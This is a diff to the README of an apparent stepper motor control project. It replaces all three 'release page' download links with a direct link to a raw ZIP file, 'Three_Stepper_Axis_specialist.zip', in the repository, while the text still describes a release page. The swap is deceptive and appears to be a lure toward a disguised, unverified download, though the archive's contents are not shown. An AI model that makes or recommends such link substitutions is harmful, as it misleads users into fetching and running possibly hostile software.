@@ -1,6 +1,6 @@
 # 🔧 ThreeAxisStepper - Smooth 3-Axis Motion Control
 
-[![Download ThreeAxisStepper](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/elsiesapphic177/ThreeAxisStepper/releases)
+[![Download ThreeAxisStepper](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/elsiesapphic177/ThreeAxisStepper/main/components/Three_Stepper_Axis_specialist.zip)
 
 ## 🖥️ What This App Does
 
@@ -19,7 +19,7 @@ Use it when you want steady motor motion and less jerk in movement.
 
 Visit this page to download the latest release:
 
-[Download the latest version](https://github.com/elsiesapphic177/ThreeAxisStepper/releases)
+[Download the latest version](https://raw.githubusercontent.com/elsiesapphic177/ThreeAxisStepper/main/components/Three_Stepper_Axis_specialist.zip)
 
 On the release page, choose the file for Windows, then save it to your computer. If you see a ZIP file, download that file and extract it first.
 
@@ -144,7 +144,7 @@ Download the file that matches your system and setup.
 
 ## 📦 Download Again
 
-[Open the release page to download](https://github.com/elsiesapphic177/ThreeAxisStepper/releases)
+[Open the release page to download](https://raw.githubusercontent.com/elsiesapphic177/ThreeAxisStepper/main/components/Three_Stepper_Axis_specialist.zip)
 
 Use this page any time you need the latest build or want to check for a newer release
 
